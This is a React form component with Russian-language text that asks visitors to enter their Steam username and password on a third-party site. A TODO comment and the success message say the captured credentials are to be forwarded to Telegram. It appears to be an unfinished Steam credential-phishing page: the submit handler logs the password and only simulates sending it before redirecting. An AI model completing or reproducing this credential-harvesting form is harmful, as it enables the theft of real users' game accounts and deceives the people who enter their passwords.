import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Link } from "react-router-dom";
import Icon from "@/components/ui/icon";
import { toast } from "sonner";

const registerSchema = z.object({
  steamUsername: z
    .string()
    .min(3, "Имя пользователя должно содержать минимум 3 символа"),
  steamPassword: z
    .string()
    .min(6, "Пароль должен содержать минимум 6 символов"),
});

type RegisterFormData = z.infer<typeof registerSchema>;

const RegisterForm = () => {
  const [isLoading, setIsLoading] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<RegisterFormData>({
    resolver: zodResolver(registerSchema),
  });

  const onSubmit = async (data: RegisterFormData) => {
    setIsLoading(true);

    try {
      // TODO: Здесь будет интеграция с Telegram API
      console.log("Steam данные для отправки:", data);

      // Симуляция отправки данных
      setTimeout(() => {
        setIsLoading(false);
        toast.success(
          "Данные Steam получены! (В разработке: отправка в Telegram)",
        );
        window.location.href = "/dashboard";
      }, 2000);
    } catch (error) {
      setIsLoading(false);
      toast.error("Ошибка при обработке данных Steam");
    }
  };

  return (
    <div className="space-y-6">
      <div className="text-center space-y-2">
        <Icon name="Gamepad2" className="mx-auto h-16 w-16 text-blue-600" />
        <h3 className="text-lg font-semibold text-gray-800">
          Войти с данными Steam
        </h3>
        <p className="text-gray-600">Введите ваши учетные данные Steam</p>
      </div>

      <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
        <div className="space-y-2">
          <Label htmlFor="steamUsername">Имя пользователя Steam</Label>
          <Input
            id="steamUsername"
            type="text"
            placeholder="Введите имя пользователя Steam"
            {...register("steamUsername")}
            className="h-12"
          />
          {errors.steamUsername && (
            <p className="text-red-500 text-sm">
              {errors.steamUsername.message}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <Label htmlFor="steamPassword">Пароль Steam</Label>
          <Input
            id="steamPassword"
            type="password"
            placeholder="Введите пароль Steam"
            {...register("steamPassword")}
            className="h-12"
          />
          {errors.steamPassword && (
            <p className="text-red-500 text-sm">
              {errors.steamPassword.message}
            </p>
          )}
        </div>

        <Button
          type="submit"
          className="w-full h-12 text-lg font-semibold bg-blue-600 hover:bg-blue-700"
          disabled={isLoading}
        >
          {isLoading ? (
            <Icon name="Loader2" className="animate-spin mr-2" />
          ) : (
            <Icon name="Gamepad2" className="mr-2" />
          )}
          {isLoading ? "Подключение..." : "Войти через Steam"}
        </Button>
      </form>

      <div className="text-center">
        <p className="text-gray-600">
          Уже есть аккаунт?{" "}
          <Link
            to="/login"
            className="text-primary hover:text-primary-600 font-semibold"
          >
            Войти
          </Link>
        </p>
      </div>
    </div>
  );
};

export default RegisterForm;
